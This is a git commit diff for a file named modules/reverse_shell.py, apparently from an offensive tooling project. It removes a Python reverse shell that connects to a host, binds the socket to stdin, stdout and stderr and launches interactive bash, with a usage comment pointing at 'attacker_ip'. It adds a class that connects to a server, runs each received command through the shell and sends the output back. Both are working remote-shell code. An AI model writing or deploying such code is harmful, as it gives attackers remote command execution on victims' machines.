af4e95ac0c9003553eeda06745198022a245d91b
Saldy <saldilinuxchch@gmail.com>
2024-12-03 06:38:23 +0800

    Update reverse_shell.py

--- modules/reverse_shell.py
+++ modules/reverse_shell.py
@@ -1,20 +1,17 @@
 import socket
 import subprocess
-import os
 
-def reverse_shell(host, port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-        
-        # Mengarahkan stdin, stdout, dan stderr ke socket
-        os.dup2(s.fileno(), 0)  # stdin
-        os.dup2(s.fileno(), 1)  # stdout
-        os.dup2(s.fileno(), 2)  # stderr
+class ReverseShell:
+    def __init__(self):
+        pass
 
-        subprocess.call(["/bin/bash", "-i"])
-    except Exception as e:
-        print(f"Reverse shell failed: {e}")
-
-# Contoh penggunaan:
-# reverse_shell("attacker_ip", 9999)
+    def start_reverse_shell(self, server_ip, server_port):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((server_ip, server_port))
+        while True:
+            command = sock.recv(1024).decode('utf-8')
+            if command == 'exit':
+                sock.close()
+                break
+            output = subprocess.run(command, shell=True, capture_output=True)
+            sock.send(output.stdout + output.stderr)
